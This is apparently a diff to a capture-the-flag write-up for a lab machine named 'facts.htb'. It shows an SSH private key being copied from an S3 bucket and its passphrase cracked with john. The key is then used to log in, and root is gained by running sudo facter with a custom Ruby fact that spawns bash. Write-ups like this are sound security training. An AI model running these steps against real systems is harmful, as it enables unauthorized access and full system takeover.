@@ -95,7 +95,7 @@ There's two buckets: randomfacts and internal. The internal bucket contains a /.
 > aws s3 cp s3://internal/.ssh/id_ed25519 . --endpoint-url http://facts.htb:54321 --profile facts
 ```
 
-### Cracking and Initial Access:
+## Cracking and Initial Access:
 
 Using ssh-keygen we actually see that the private key is protected by a passphrase --> ret prompt: Enter passphrase for "id_ed25519":
 ```
@@ -110,16 +110,63 @@ Now crack the output file with john:
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 <img src="images/passphrase.png" width="500"> 
+
 ```
-  john --show hash.txt
+> john --show hash.txt
   id_ed25519:d**********
   1 password hash cracked, 0 left
 ```
+We need to 'chmod 600 key' because OpenSSH refuses to use private keys with overly permissive permissions; chmod 600 ensures only the owner can read and write the key, preventing other users from accessing it.
+We also need to generate the public key from the private key because SSH uses the public key on the server to verify the identity. While connecting with -i private_key, the server checks that the private key matches the stored public key in ~/.ssh/authorized_keys; without the public key on the server, authentication will fail.
+```
+chmod 600 id_ed25519
+```
+Hence, let's generate the key using the passphrase:
+```
+ssh-keygen -y -f id_ed25519
+Enter passphrase for "id_ed25519": 
+ssh-ed25519 A******************************************************************M t*****@facts.htb
+```
+The comment gives us an important hint, an username: t*****
+Now we just have to ssh login:  
 
+```
+ssh -i id_ed25519 t*****@facts.htb
+```
+The user flag is located in /home/w*******/user.txt.
 
+## Privilege Escalation:
 
+As the t**** user, we check our sudo permissions:
+```
+> sudo -l
+    (ALL) NOPASSWD: /usr/bin/facter.
+```
+Facter is a tool used to gather “facts” about a system, typically used in conjunction with Puppet. 
 
+Let's check https://gtfobins.org/gtfobins/facter/
 
+Facter allows users to specify a --custom-dir from which it will load Ruby scripts to define new facts.
 
+### Crafting the Ruby Payload:
+Since Facter is running as root, any Ruby code it executes will inherit root privileges. We create a malicious Ruby fact that spawns a bash shell.
+```
+mkdir -p /tmp/facts
+nano /tmp/facts/exploit.rb
+```
+```
+Facter.add(:exploit) do
+  setcode do
+    system("/bin/bash")
+  end
+end
+```
+### Executing the Root Exploit:
+Let's save the exploit to /tmp/facts/exploit.rb and execute it:
+```
+> sudo /usr/bin/facter --custom-dir /tmp/facts
+```
+The root flag is stored in /root/root.txt as always.
 
+END.
 
